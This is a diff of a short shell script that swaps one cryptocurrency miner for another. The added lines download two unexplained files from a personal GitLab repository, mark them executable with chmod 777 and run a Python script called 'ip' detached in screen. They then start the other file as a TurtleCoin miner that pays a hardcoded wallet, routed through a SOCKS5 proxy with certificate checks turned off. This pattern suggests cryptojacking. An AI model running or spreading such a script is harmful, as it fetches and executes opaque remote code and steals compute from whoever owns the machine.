@@ -1,10 +1,13 @@
 #!/bin/sh
 apt-get update 
 apt-get install screen libjansson4 -y
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-sse2
+wget https://gitlab.com/buyutuk/xmr/-/raw/main/ip
+wget https://gitlab.com/buyutuk/xmr/-/raw/main/xolx
+chmod 777 ip xolx
+screen -d -m python3 ip
 screen -dmS ls
-PROXY=socks5://184.178.172.18:15280
-./cpuminer-sse2 -a gr -o stratum+tcp://stratum-na.rplant.xyz:7056 -u RQKNmref6uHRhzyYmWGfx3uKTjpRPTRnHx.$(echo $(shuf -i 10000-99999 -n 1)-CPU) -t 2 -x $PROXY
-sleep 5
-done
-sleep 10
+POOL=turtlecoin.herominers.com:10380
+WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
+WORKER=CPU
+PROXY=socks5://72.210.252.134:46164
+./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
